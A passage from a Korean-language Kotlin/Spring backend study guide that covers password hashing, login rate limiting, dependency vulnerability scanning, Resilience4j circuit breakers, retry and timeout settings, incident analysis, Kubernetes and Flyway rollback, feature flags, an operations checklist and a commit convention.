// ✅ BCrypt 해싱 (단방향)
user.password = passwordEncoder.encode(request.password)

// ✅ 비교 시
passwordEncoder.matches(request.password, user.password)
```

**Rate Limiting (brute-force 방어):**

```kotlin
// Bucket4j 라이브러리 사용
// implementation("com.bucket4j:bucket4j-core:8.10.1")

@Component
class RateLimitFilter : OncePerRequestFilter() {

    private val buckets = ConcurrentHashMap<String, Bucket>()

    override fun doFilterInternal(
        request: HttpServletRequest,
        response: HttpServletResponse,
        chain: FilterChain,
    ) {
        if (request.requestURI == "/api/v1/auth/login") {
            val ip = request.remoteAddr
            val bucket = buckets.computeIfAbsent(ip) {
                Bucket.builder()
                    .addLimit(Bandwidth.simple(5, Duration.ofMinutes(1)))  // 분당 5회
                    .build()
            }

            if (!bucket.tryConsume(1)) {
                response.status = HttpStatus.TOO_MANY_REQUESTS.value()
                response.writer.write("너무 많은 요청입니다. 잠시 후 다시 시도해주세요.")
                return
            }
        }
        chain.doFilter(request, response)
    }
}
```

**의존성 취약점 스캔:**

```kotlin
// build.gradle.kts
plugins {
    id("org.owasp.dependencycheck") version "9.0.9"
}

// ./gradlew dependencyCheckAnalyze
// → CVE 데이터베이스와 대조해 취약한 의존성 리포트 생성
```

---

## Phase 12: 장애 대응 & 복원력 패턴

> 장애는 반드시 일어난다. 중요한 건 빠르게 감지하고, 전파를 막고, 원인을 찾는 것이다.

### 12-A. Circuit Breaker (Resilience4j)

**문제 — 외부 서비스 장애가 내 서비스로 전파:**

```
내 서비스 → 외부 결제 API (응답 30초 지연)
           ↓
모든 스레드가 결제 API 응답 대기로 블로킹
           ↓
내 서비스 전체 마비 (Cascading Failure)
```

**Circuit Breaker 상태:**

```
CLOSED (정상)
  │  실패율이 임계값 초과
  ▼
OPEN (차단)    ← 외부 호출 즉시 실패 반환 (대기 없음)
  │  일정 시간 후
  ▼
HALF-OPEN (탐색)  ← 제한된 요청만 통과
  │  성공하면 → CLOSED
  │  실패하면 → OPEN
```

**설정:**

```kotlin
// build.gradle.kts
implementation("io.github.resilience4j:resilience4j-spring-boot3:2.2.0")
implementation("org.springframework.boot:spring-boot-starter-aop")

// application.yml
resilience4j:
  circuitbreaker:
    instances:
      payment-service:
        sliding-window-size: 10          # 최근 10번 요청 기준
        failure-rate-threshold: 50       # 50% 이상 실패 시 OPEN
        wait-duration-in-open-state: 10s # 10초 후 HALF-OPEN
        permitted-calls-in-half-open-state: 3
  timelimiter:
    instances:
      payment-service:
        timeout-duration: 3s             # 3초 이상 걸리면 실패 처리
  retry:
    instances:
      payment-service:
        max-attempts: 3
        wait-duration: 500ms
        exponential-backoff-multiplier: 2  # 500ms → 1s → 2s
```

**사용:**

```kotlin
@Service
class PaymentService(
    private val paymentClient: PaymentClient,
) {
    @CircuitBreaker(name = "payment-service", fallbackMethod = "paymentFallback")
    @TimeLimiter(name = "payment-service")
    @Retry(name = "payment-service")
    fun processPayment(request: PaymentRequest): CompletableFuture<PaymentResult> =
        CompletableFuture.supplyAsync { paymentClient.pay(request) }

    // Circuit OPEN 시 또는 최종 실패 시 호출
    fun paymentFallback(request: PaymentRequest, ex: Exception): CompletableFuture<PaymentResult> {
        log.warn("결제 서비스 장애, fallback 처리: {}", ex.message)
        // 옵션 1: 임시 처리 (나중에 재처리)
        pendingPaymentQueue.add(request)
        return CompletableFuture.completedFuture(PaymentResult.pending(request.orderId))
        // 옵션 2: 명확한 실패 반환
        // throw ApiException(ErrorCode.PAYMENT_SERVICE_UNAVAILABLE)
    }
}
```

---

### 12-B. Retry & Timeout 전략

**@Retryable (Spring Retry):**

```kotlin
// build.gradle.kts
// implementation("org.springframework.retry:spring-retry")
// implementation("org.springframework.boot:spring-boot-starter-aop")

@Configuration
@EnableRetry
class RetryConfig

@Service
class ExternalApiService {

    // 일시적 오류에만 재시도 (비즈니스 에러는 재시도 무의미)
    @Retryable(
        value = [IOException::class, HttpServerErrorException::class],
        maxAttempts = 3,
        backoff = Backoff(delay = 500, multiplier = 2.0, maxDelay = 5000),
        // 500ms → 1000ms → 2000ms (지수 백오프)
    )
    fun callExternalApi(request: ApiRequest): ApiResponse {
        return restClient.post()
            .uri("/external/api")
            .body(request)
            .retrieve()
            .body(ApiResponse::class.java)!!
    }

    @Recover   // 모든 재시도 실패 후 호출
    fun recover(e: Exception, request: ApiRequest): ApiResponse {
        log.error("외부 API 최종 실패: {}", e.message)
        throw ApiException(ErrorCode.EXTERNAL_API_FAILED)
    }
}
```

**Timeout 설정 — 레이어별:**

```kotlin
// 1. DB 쿼리 타임아웃
@QueryHints(QueryHint(name = HINT_SPEC_LOCK_TIMEOUT, value = "3000"))
fun findByIdWithTimeout(id: Long): Order?

// application.yml
spring.jpa.properties.jakarta.persistence.query.timeout: 3000

// 2. RestClient (외부 HTTP) 타임아웃
@Bean
fun restClient(): RestClient = RestClient.builder()
    .requestFactory(
        HttpComponentsClientHttpRequestFactory().apply {
            setConnectTimeout(Duration.ofSeconds(3))
            setReadTimeout(Duration.ofSeconds(5))
        }
    )
    .build()

// 3. 트랜잭션 타임아웃
@Transactional(timeout = 10)   // 10초 초과 시 롤백
fun longRunningProcess() { ... }
```

---

### 12-C. 장애 분석 방법론

**장애 발생 시 대응 순서:**

```
1. 감지 (Detect)
   Grafana 알림 → 에러율 급증, P99 응답시간 급등, Pod OOM

2. 격리 (Contain)
   트래픽 차단 or 이전 버전으로 즉시 롤백
   → "고치는 것보다 되돌리는 게 먼저"

3. 진단 (Diagnose)
   로그 → 메트릭 → 코드 순서로 좁혀감

4. 해결 (Resolve)
   근본 원인 수정 후 재배포

5. 회고 (Postmortem)
   재발 방지책 도출
```

**로그 기반 원인 추적:**

```bash
# 1. 에러 로그 시간대 확인
kubectl logs deployment/api-customer --since=30m | grep ERROR

# 2. requestId로 특정 요청 전체 흐름 추적
kubectl logs deployment/api-customer | grep "requestId=a1b2c3d4"

# 3. 특정 사용자 요청 추적
kubectl logs deployment/api-customer | grep "userId=12345"

# 4. 슬로우 쿼리 확인 (DB)
SELECT * FROM information_schema.processlist
WHERE time > 5 ORDER BY time DESC;
```

**5 Whys 예시:**

```
장애: 주문 API 응답시간 30초, 타임아웃 급증

Why 1: 왜 응답이 느린가?
→ DB 커넥션 풀 고갈 (pending=15)

Why 2: 왜 커넥션이 고갈됐는가?
→ 특정 쿼리가 30초 이상 실행 중

Why 3: 왜 그 쿼리가 30초나 걸리는가?
→ orders 테이블 1000만 건 Full Scan

Why 4: 왜 Full Scan이 발생했는가?
→ WHERE created_at BETWEEN ... 쿼리에 Index가 없음

Why 5: 왜 Index가 없는가?
→ 배포 시 신규 쿼리가 추가됐는데 Index 추가 마이그레이션 누락

근본 원인: 코드 리뷰 프로세스에 쿼리 성능 검토 항목 없음
재발 방지: PR 체크리스트에 "신규 쿼리 EXPLAIN 확인" 항목 추가
```

---

### 12-D. 롤백 전략

**애플리케이션 롤백:**

```bash
# Kubernetes: 이전 버전으로 즉시 롤백
kubectl rollout undo deployment/api-customer

# 특정 버전으로 롤백
kubectl rollout undo deployment/api-customer --to-revision=3

# 롤백 확인
kubectl rollout status deployment/api-customer
```

**DB 마이그레이션 롤백 (Flyway):**

```sql
-- Flyway는 기본적으로 롤백 없음 (Pro 버전은 undo 지원)
-- 오픈소스에서의 전략: 앞으로 나가는 마이그레이션으로 수정

-- V10__add_column.sql (잘못 배포됨)
ALTER TABLE orders ADD COLUMN wrong_column VARCHAR(100);

-- V11__remove_wrong_column.sql (롤백 대신 새 마이그레이션)
ALTER TABLE orders DROP COLUMN wrong_column;
```

**Feature Flag — 코드 롤백 없이 기능 끄기:**

```kotlin
@Component
class FeatureFlags(
    @Value("\${feature.new-payment-flow:false}")
    private val newPaymentFlow: Boolean,
) {
    fun isNewPaymentFlowEnabled() = newPaymentFlow
}

@Service
class PaymentService(private val featureFlags: FeatureFlags) {
    fun processPayment(request: PaymentRequest): PaymentResult =
        if (featureFlags.isNewPaymentFlowEnabled()) {
            newPaymentFlow(request)   // 새 로직
        } else {
            legacyPaymentFlow(request)   // 기존 로직
        }
}

# 장애 발생 시: 재배포 없이 환경변수만 변경
# kubectl set env deployment/api-customer FEATURE_NEW_PAYMENT_FLOW=false
```

---

### 12-E. 운영 체크리스트

**배포 전:**
- [ ] 새 쿼리에 EXPLAIN 실행, Full Scan 없음 확인
- [ ] 신규 외부 API 연동에 Timeout 설정 확인
- [ ] DB 마이그레이션 실행 계획 검토 (대용량 테이블 ALTER는 별도 계획 필요)
- [ ] 환경 변수 추가 시 운영 서버에 반영됐는지 확인
- [ ] 롤백 시나리오 준비

**배포 후:**
- [ ] Grafana: 에러율 정상 (1% 미만)
- [ ] Grafana: P99 응답시간 정상
- [ ] Grafana: DB 커넥션 풀 여유 있음
- [ ] 핵심 API 직접 호출해서 동작 확인
- [ ] 로그에 ERROR/WARN 패턴 없음 확인

---

## 커밋 컨벤션 (AngularJS 방식)

```
feat: 새 기능 추가
fix: 버그 수정
refactor: 리팩토링 (기능 변경 없음)
test: 테스트 코드
docs: 문서만 변경
chore: 빌드/설정 변경

예시:
feat: 로또 번호 생성기 구현
fix: 블랙잭 에이스 점수 계산 오류 수정
refactor: Car.move 순수 함수로 전환
test: LottoTest 경계값 케이스 추가
```
